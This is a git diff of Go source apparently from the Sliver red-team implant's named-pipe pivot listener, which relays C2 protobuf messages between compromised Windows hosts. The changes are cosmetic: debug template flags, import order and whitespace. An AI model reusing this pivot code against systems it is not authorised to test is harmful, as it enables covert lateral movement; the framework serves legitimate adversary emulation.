@@ -19,30 +19,29 @@ package pivots
 */
 
 import (
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+	"math/rand"
 	"net"
 	"os"
 	"strings"
 	"time"
-	"math/rand"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/sliver/transports"
 	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
+	"github.com/bishopfox/sliver/sliver/transports"
 
 	"github.com/golang/protobuf/proto"
 )
 
-
 func StartNamedPipeListener(pipeName string) error {
 	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
 	// {{end}}
 	if err != nil {
-		return err	
+		return err
 	}
 	go nampedPipeAcceptNewConnection(&ln)
 	return nil
@@ -51,7 +50,7 @@ func StartNamedPipeListener(pipeName string) error {
 func nampedPipeAcceptNewConnection(ln *net.Listener) {
 	hostname, err := os.Hostname()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to determine hostname %s", err)
 		// {{end}}
 		hostname = "."
@@ -67,7 +66,7 @@ func nampedPipeAcceptNewConnection(ln *net.Listener) {
 		pivotsMap.AddPivot(pivotID, &conn, "named-pipe", namedPipe)
 		//SendPivotOpen(pivotID, "named-pipe", namedPipe)
 
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("Accepted a new connection")
 		// {{end}}
 
@@ -79,7 +78,7 @@ func nampedPipeAcceptNewConnection(ln *net.Listener) {
 func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {
 
 	defer func() {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Cleaning up for pivot %d\n", pivotID)
 		// {{end}}
 		(*conn).Close()
@@ -88,7 +87,7 @@ func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {
 		}
 		data, err := proto.Marshal(pivotClose)
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Println(err)
 			// {{end}}
 			return
@@ -105,14 +104,14 @@ func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {
 	for {
 		envelope, err := PivotReadEnvelope(conn)
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Println(err)
 			// {{end}}
 			return
 		}
 		dataBuf, err1 := proto.Marshal(envelope)
 		if err1 != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Println(err1)
 			// {{end}}
 			return
@@ -128,7 +127,7 @@ func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {
 		}
 		data2, err2 := proto.Marshal(pivotOpen)
 		if err2 != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Println(err2)
 			// {{end}}
 			return
